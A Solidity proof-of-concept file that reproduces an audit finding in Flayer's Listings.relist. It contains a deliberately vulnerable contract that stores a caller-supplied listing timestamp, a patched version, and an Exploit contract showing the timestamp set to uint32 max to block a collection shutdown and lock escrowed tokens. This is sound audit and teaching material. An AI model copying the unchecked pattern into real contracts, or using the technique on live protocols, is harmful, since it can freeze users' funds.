// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Flayer — Listings.relist (Sherlock 2024-08, issue 164)
    relist stores listing.created from the caller. A relister sets it to
    uint32.max. CollectionShutdown treats the listing as live a year later,
    so the floor inventory escrowed for shutdown cannot be paid out.
    Stamping created = block.timestamp lets that same horizon succeed.
*/

contract FloorToken {
    string public symbol = "FLOOR";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Listings {
    struct Listing {
        address owner;
        uint40 created;
        uint40 duration;
    }

    mapping(uint256 => Listing) public listings;

    function seed(uint256 tokenId, address owner) external {
        listings[tokenId] = Listing(owner, uint40(block.timestamp), 1 days);
    }

    function relist(uint256 tokenId, Listing calldata listing) external {
        Listing memory oldListing = listings[tokenId];
        if (oldListing.owner == msg.sender) revert("CallerIsAlreadyOwner");
        // @> VULN: listing.created is stored from the caller and is not overwritten with block.timestamp
        if (oldListing.owner == address(0)) revert("ListingNotAvailable");
        listings[tokenId] = listing;
    }

    function get(uint256 tokenId) external view returns (Listing memory) {
        return listings[tokenId];
    }
}

contract ListingsFixed {
    struct Listing {
        address owner;
        uint40 created;
        uint40 duration;
    }

    mapping(uint256 => Listing) public listings;

    function seed(uint256 tokenId, address owner) external {
        listings[tokenId] = Listing(owner, uint40(block.timestamp), 1 days);
    }

    function relist(uint256 tokenId, Listing calldata listing) external {
        Listing memory oldListing = listings[tokenId];
        if (oldListing.owner == msg.sender) revert("CallerIsAlreadyOwner");
        if (oldListing.owner == address(0)) revert("ListingNotAvailable");
        Listing memory stored = listing;
        stored.created = uint40(block.timestamp);
        listings[tokenId] = stored;
    }

    function get(uint256 tokenId) external view returns (Listing memory) {
        return listings[tokenId];
    }
}

contract Shutdown {
    FloorToken public immutable token;
    Listings public immutable listings;
    uint256 public constant TOKEN_ID = 1;

    constructor(FloorToken _token, Listings _listings) {
        token = _token;
        listings = _listings;
    }

    function execute() external returns (uint256 paid) {
        Listings.Listing memory listing = listings.get(TOKEN_ID);
        uint256 atTime = block.timestamp + 365 days;
        require(uint256(listing.created) + uint256(listing.duration) <= atTime, "live listing");
        paid = token.balanceOf(address(this));
        require(token.transfer(msg.sender, paid), "pay");
    }
}

contract ShutdownFixed {
    FloorToken public immutable token;
    ListingsFixed public immutable listings;

    constructor(FloorToken _token, ListingsFixed _listings) {
        token = _token;
        listings = _listings;
    }

    function execute() external returns (uint256 paid) {
        ListingsFixed.Listing memory listing = listings.get(1);
        uint256 atTime = block.timestamp + 365 days;
        require(uint256(listing.created) + uint256(listing.duration) <= atTime, "live listing");
        paid = token.balanceOf(address(this));
        require(token.transfer(msg.sender, paid), "pay");
    }
}

contract Exploit {
    uint256 public constant LOCKED = 1000 ether;
    FloorToken public token;
    Listings public listings;
    Shutdown public shutdown;
    bool public executeReverted;
    uint40 public storedCreated;

    constructor() {
        token = new FloorToken();
        listings = new Listings();
        shutdown = new Shutdown(token, listings);
        token.mint(address(this), LOCKED);
    }

    function run() external {
        listings.seed(1, address(0xB0B));
        require(token.transfer(address(shutdown), LOCKED), "escrow");
        listings.relist(1, Listings.Listing({owner: address(this), created: uint40(type(uint32).max), duration: 30 days}));
        storedCreated = listings.get(1).created;
        try shutdown.execute() {
            executeReverted = false;
        } catch {
            executeReverted = true;
        }
        require(storedCreated == uint40(type(uint32).max), "created stamped");
        require(executeReverted, "shutdown ran");
        require(token.balanceOf(address(shutdown)) == LOCKED, "floor still escrowed");
        require(token.balanceOf(address(this)) == 0, "caller was not paid");
    }
}
